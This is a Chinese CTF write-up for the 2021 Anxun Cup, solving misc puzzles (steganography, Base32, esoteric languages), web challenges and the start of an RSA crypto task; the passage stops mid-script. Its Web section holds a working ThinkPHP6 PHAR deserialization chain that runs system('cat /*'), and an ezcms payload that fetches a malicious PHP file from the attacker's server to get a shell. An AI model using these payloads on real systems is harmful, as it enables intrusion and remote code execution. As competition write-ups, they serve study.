# 2021年第四届安洵杯 WP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Misc
###  应该算是签到
    快去BV1ZX4y1V7Qb找一条全部由字母和下划线构成的特色flag弹幕吧！flag格式为D0g3{xxxxxxx_xx_xxxxxxxxx}
> 访问视频半天没找到`flag`，眼看几分钟都十几解了，我想到了村霸的一句名言：钓不到鱼我就用抽水机来抽（
>
> 直接用`jjdown`下载该视频的XML弹幕文件，然后直接搜索`D0g3`
    D0g3{welcome_to_axbgogogo}
###  Cthulhu Mythos
> 首先听一下音频文件，`1min`后有`SSTV`的声音（但把头部挖了），用软件解一下
> 可看到一串`Base32`的字符串，但是拿去解只能得到一半的`flag`
    MRPVI4TZL5KGK4TSGRZGSYJBPU======
> 音频的前一分钟是`Terraria`的音乐，这提示下面这个`.wld`文件是一个`Terraria`的地图文件
>
>
> 由于我没有玩过`Terraria`，我就先去找了一个[地图查看器](https://terramap.github.io/index.html)。可以看见地面上有`4`个玻璃制的箱子
> 最右边的箱子名字乱码了，应该是中文导致
> 换一个离线运行的编辑器可以看出第四个箱子的名称
> 把前面`3`个箱子的信息组合一下，可得到`Base32`的前半段
    IQYGOM33JUYW4ZLDKI2GM5C
> 但是跟后半段不能很好地接上，第四个箱子的说明也提示了还有一段`flag`
>
> 我还是把这个地图给了某个`Terraria`玩家，他玩了一会说只要拿着扳手就可以在出生点看到信息
> 我又换了一个[地图编辑器](https://www.terraria-map-editor.com/)，也看到了
    7I4YF6QLO
> 把解出来的所有字符串按顺序拼起来
    IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU======
    D0g3{M1necR4ft_G0_And_Try_Terr4ria!}
###  CyzCC_loves_LOL
> 打开附件看到一个大概能读懂的代码和一个加密的`zip`文件
>
> 神奇的代码用`Dcode`检测一下发现是一种叫`LOLCODE`的语言
> 用在线工具跑一下得到输出就是压缩包密码
> 解压`ez_misc.zip`后，里面有两个文件：`Program.png`和`jinx's_flag_in_silent.jpg`
>
>
> `Program.png`有经验直接看出来是`brainloller`，用[在线工具](https://minond.xyz/brainloller/)运行一下
> `jinx's_flag_in_silent.jpg`由文件名提示是`Silent Eye`隐写，用该工具解密（题目说明中指出要把空格换成下划线）
    D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}
###  lovemath
> 打开压缩包很明显可以知道是`CRC32`爆破来获取六字节文件内的部分压缩包密码
> 利用`CRC32
> Tools`来辅助爆破攻击，并结合特征点来确认压缩包密码内容，得到压缩包的密码为：`th1s_Is_Y0ur_pa33w0rd_We1c0m3e`
> 得到图片`blind.png`，利用`Stegsolve`在`bgr`组合三个通道的最底层提取到一张图片
> 根据题目描述，猜测是`Tupper自我指涉公式`，利用在线网站解密得到`FLAG`：`D0g3{I_LOV3_math}`
## Web
###  EZ_TP
> 利用`ThinkPHP6`反序列化链子结合`PHAR`协议来获取`FLAG`
    filter = 'system';
                $this->param = ['cat /*'];
                $this->hook = ['visible' => [$this, 'isAjax']];
                $this->config = ['var_ajax' => ''];
            }
        }
        abstract class Model {
            private $data = [];
            protected $append = [];
            function __construct() {
                $this->append = ['h3rmesk1t' => ['a']];
                $this->data = ['h3rmesk1t' => new Request()];
            }
        }
    }
    namespace think\model {
        use think\Model;
        use think\Request;
        class Pivot extends Model {
        }
    }
    namespace think\process\pipes {
        use think\model\Pivot;
        class Pipes {
        }
        class Windows extends Pipes {
            private $files = [];
            function __construct() {
                $this->files = [new Pivot()];
            }
        }
    }
    namespace {
        use think\process\pipes\Windows;
        $phar = new Phar("shell.phar");
        $phar->startBuffering();
        $phar->setStub(" __HALT_COMPILER(); ?>");
        $demo = new Windows();
        $phar->setMetadata($demo);
        $phar->addFromString("hello.txt", "demo");
        $phar->stopBuffering();
    }
>
> 利用[CyberChef](https://gchq.github.io/CyberChef/)来对生成的`PHAR`文件进行`BASE64-ENCODE`操作，接着将得到的结果通过`POST`传参并绕过限制条件，即可获得`FLAG`
###  ezcms
> 审计代码后发现`CxWsbN_AR4\Ant_Curl.php`文件中存在远程文件下载漏洞
> 利用`Payload`：`题目地址/CxWsbN_AR4/Ant_Curl.php?url=服务器IP/sem-cms.cn/sem-> cms.cn5.php`即可下载含有恶意代码的`PHP`文件
> 接着访问`题目地址/Soft/Zip/sem-cms.cn5.php`来`Getshell`
## Crypto
###  little_trick
>
> 第一部分和今年的祥云杯中的`Random_RSA`类似，`Python`随机数相同的随机数种子产生的随机数序列相同，先用题目给出的`seeds`、`result`等参数来反算出`dp`的值
    from gmpy2 import *
    import binascii
    import random
    seeds = [3, 0, 39, 78, 14, 49, 73, 83, 55, 48, 30, 28, 23, 16, 54, 23, 68, 7, 20, 8, 98, 68, 45, 36, 97, 13, 83, 68, 16, 59, 81, 26, 51, 45, 36, 60, 36, 94, 58, 11, 19, 33, 95, 12, 60, 38, 51, 95, 21, 3, 38, 72, 47, 80, 7, 20, 26, 80, 18, 43, 92, 4, 64, 93, 91, 12, 86, 63, 46, 73, 89, 5, 91, 17, 88, 94, 80, 42, 90, 14, 45, 53, 91, 16, 28, 81, 62, 63, 66, 20, 81, 3, 43, 99, 54, 22, 2, 27, 2, 62, 88, 99, 78, 25, 76, 49, 28, 96, 95, 57, 94, 53, 32, 58, 32, 72, 89, 15, 4, 78, 89, 74, 86, 45, 51, 65, 13, 75, 95, 42, 20, 77, 34, 66, 56, 20, 26, 18, 28, 11, 88, 62, 72, 27, 74, 42, 63, 76, 82, 97, 75, 92, 1, 5, 20, 78, 46, 85, 81, 54, 64, 87, 37, 91, 38, 39, 1, 90, 61, 28, 13, 60, 37, 90, 87, 15, 78, 91, 99, 58, 62, 73, 70, 56, 82, 5, 19, 54, 76, 88, 4, 3, 55, 3, 3, 22, 85, 67, 98, 28, 32, 42, 48, 96, 69, 3, 83, 48, 26, 20, 45, 16, 45, 47, 92, 0, 54, 4, 73, 8, 31, 38, 3, 10, 84, 60, 59, 69, 64, 91, 98, 73, 81, 98, 9, 70, 44, 44, 24, 95, 83, 49, 31, 19, 89, 18, 20, 78, 86, 95, 83, 23, 42, 51, 95, 80, 48, 46, 88, 7, 47, 64, 55, 4, 62, 37, 71, 75, 98, 67, 98, 58, 66, 70, 24, 58, 56, 44, 11, 78, 1, 78, 89, 97, 83, 72, 98, 12, 41, 33, 14, 40, 27, 5, 18, 35, 25, 31, 69, 97, 84, 47, 25, 90, 78, 15, 72, 71]
    res = [-38, -121, -40, -125, -51, -29, -2, -21, -59, -54, -51, -40, -105, -5, -4, -50, -127, -56, -124, -128, -23, -104, -63, -112, -34, -115, -58, -99, -24, -102, -1, -5, -34, -3, -104, -103, -21, -62, -121, -24, -115, -9, -87, -56, -39, -30, -34, -4, -33, -5, -114, -21, -19, -7, -119, -107, -115, -6, -25, -27, -32, -62, -28, -20, -60, -121, -102, -10, -112, -7, -85, -110, -62, -100, -110, -29, -41, -55, -113, -112, -45, -106, -125, -25, -57, -27, -83, -2, -51, -118, -2, -10, -50, -40, -1, -82, -111, -113, -50, -48, -23, -33, -112, -38, -29, -26, -4, -40, -123, -4, -44, -120, -63, -38, -41, -22, -50, -50, -17, -122, -61, -5, -100, -22, -44, -47, -125, -125, -127, -55, -117, -100, -2, -26, -32, -111, -123, -118, -16, -24, -20, -40, -92, -40, -102, -49, -99, -45, -59, -98, -49, -13, -62, -128, -121, -114, -112, -13, -3, -4, -26, -35, -15, -35, -8, -18, -125, -14, -6, -60, -113, -104, -120, -64, -104, -55, -104, -41, -34, -106, -105, -2, -28, -14, -58, -128, -3, -1, -17, -38, -18, -12, -59, -4, -19, -82, -40, -122, -18, -42, -53, -60, -113, -40, -126, -15, -63, -40, -124, -114, -58, -26, -35, -26, -8, -48, -112, -52, -11, -117, -52, -32, -21, -38, -124, -13, -103, -6, -30, -33, -28, -31, -1, -97, -59, -64, -28, -1, -40, -2, -10, -26, -24, -3, -50, -113, -125, -122, -124, -5, -50, -62, -11, -8, -88, -109, -7, -31, -105, -54, -28, -8, -62, -58, -101, -58, -53, -124, -18, -124, -17, -109, -52, -45, -40, -109, -85, -7, -108, -121, -58, -49, -91, -102, -8, -10, -17, -55, -19, -11, -116, -47, -120, -121, -23, -99, -19, -51, -36, -110, -126, -29, -110, -9, -97, -54, -83, -86]
    dp = ''